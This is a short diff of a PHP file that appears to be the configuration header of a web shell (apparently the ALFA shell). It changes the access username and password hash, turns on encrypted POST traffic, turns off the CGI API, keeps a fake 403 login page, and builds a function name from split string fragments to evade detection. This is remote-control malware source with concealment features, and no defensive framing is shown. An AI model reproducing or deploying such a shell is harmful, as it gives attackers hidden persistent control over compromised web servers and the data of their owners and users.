@@ -8,12 +8,12 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
-    'safe_mode' => '0',
+    'password' => '78992d4af7e1f5215eefe920a0100941',//md5(ehsan)
+    'safe_mode' => '1',
     'login_page' => '403',
     'show_icons' => '1',
-    'post_encryption' => false,
-    'cgi_api' => true,
+    'post_encryption' => true,
+    'cgi_api' => false,
 );
 
 $CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
